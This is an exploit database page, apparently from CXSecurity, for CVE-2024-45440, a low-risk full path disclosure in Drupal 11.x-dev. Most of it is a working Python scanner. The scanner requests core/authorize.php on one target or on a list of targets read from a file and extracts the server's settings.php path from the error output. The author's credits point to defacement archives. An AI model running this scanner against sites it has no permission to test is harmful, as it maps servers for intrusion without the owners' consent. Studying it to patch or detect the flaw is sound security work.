---
title: Drupal 11.x-dev Full Path Disclosure
url: https://cxsecurity.com/issue/WLB-2025050041
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-05-23
fetch_date: 2025-10-06T22:26:47.099972
---

# Drupal 11.x-dev Full Path Disclosure

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Drupal 11.x-dev Full Path Disclosure** **2025.05.22**  Credit:  **[Milad Karimi (Ex3ptionaL)](https://cxsecurity.com/author/Milad%2BKarimi%2B%28Ex3ptionaL%29/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-45440](https://cxsecurity.com/cveshow/CVE-2024-45440/ "Click to see CVE-2024-45440")**  CWE: **N/A** | |

#!/usr/bin/env python
# Exploit Title: Drupal 11.x-dev - Full Path Disclosure
# Date: 2025-04-16
# Exploit Author: Milad Karimi (Ex3ptionaL)
# Contact: miladgrayhat@gmail.com # Zone-H: www.zone-h.org/archive/notifier=Ex3ptionaL
# MiRROR-H: https://mirror-h.org/search/hacker/49626/
# Version: 11.x-dev
# CVE: CVE-2024-45440
# -\*- coding:UTF-8 -\*-
import re
import requests
def banners():
cve\_id = "CVE-2024-45440"
description = "Drupal 11.x-dev Full Path Disclosure Vulnerability: " \
"core/authorize.php allows Full Path Disclosure (even
when error logging is None) " \
"if the value of hash\_salt is file\_get\_contents of a file
that does not exist."
disclaimer = "This tool is for educational purposes only. Any misuse of
this information is the responsibility of " \
"the person utilizing this tool. The author assumes no
responsibility or liability for any misuse or " \
"damage caused by this program."
width = 100
banner\_top\_bottom = "=" \* width
banner\_middle = f"{cve\_id:^{width}}\n\n{description:^{width}}"
banner =
f"{banner\_top\_bottom}\n\n{banner\_middle}\n\n{disclaimer}\n\n{banner\_top\_bottom}"
return banner
def scan\_single\_url(url=None):
if url is None:
print("[+] Input the IP/Domain Example: 127.0.0.1 or 127.0.0.1:8080")
url = input("[+] IP/Domain: ")
if not url.startswith('https://') and not url.startswith('http://'):
full\_url = 'http://' + url + '/core/authorize.php'
print("[\*] Scanning...")
try:
headers = {
"Host": url,
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64;
rv:133.0) Gecko/20100101 Firefox/133.0",
"Accept":
"text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8",
"Accept-Language":
"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"
}
response = requests.get(full\_url, headers,timeout=10)
pattern = r'<em class="placeholder">(/.\*?settings\.php)'
matches = re.findall(pattern, response.text)
# print(response.text)
if 'settings.php' in response.text:
print(f"[+] {url} Existed!")
for match in matches:
print("[+] The full path is:", match)
return True
else:
print(f"[-] {url} Not Exist!")
return False
except TimeoutError:
print(f"[-] {url} Timeout!")
except Exception as e:
print(f"[-] {url} Failed!")
return False
def scan\_multiple\_urls():
print("[+] Input the path of txt Example: ./url.txt or
C:\\the\\path\\to\\url.txt")
url\_path = input("[+] Path: ")
url\_list = []
result\_list = []
try:
with open(url\_path, 'r', encoding='utf-8') as f:
lines = f.readlines()
for line in lines:
url\_list.append(line.strip())
except FileNotFoundError as e:
print("[-] File Not Found!")
for url in url\_list:
result = scan\_single\_url(url)
if result:
result\_list.append(url)
print("[+] Successful Target:")
for result in result\_list:
print(f"[+] {result}")
def main():
print(banners())
print("[1] Scan single url\n[2] Scan multiple urls")
choice = input("[+] Choose: ")
if choice == '1':
scan\_single\_url()
elif choice == '2':
scan\_multiple\_urls()
else:
print("[-] Invalid option selected!")
pass
if \_\_name\_\_ == '\_\_main\_\_':
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025050041)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top